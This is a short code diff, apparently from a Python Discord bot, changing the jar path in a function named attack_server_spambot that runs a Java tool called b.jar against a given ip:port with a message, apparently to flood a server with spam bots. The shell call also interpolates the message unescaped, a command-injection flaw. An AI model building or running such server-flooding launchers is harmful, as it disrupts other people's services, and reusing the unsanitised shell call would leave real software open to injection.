@@ -20,7 +20,7 @@ def attack_server(ip):
 
 def attack_server_spambot(ip, message, path_desktop):
     ip1, port = ip.split(':', 1)
-    os.system(f'timeout 80s java -Dip={ip1}:{port} -Xmx1800M -Dmsg=\"{message}\" -jar {path_desktop}\\b.jar')
+    os.system(f'timeout 80s java -Dip={ip1}:{port} -Xmx1800M -Dmsg=\"{message}\" -jar b.jar')
 
 @bot.event
 async def on_ready():
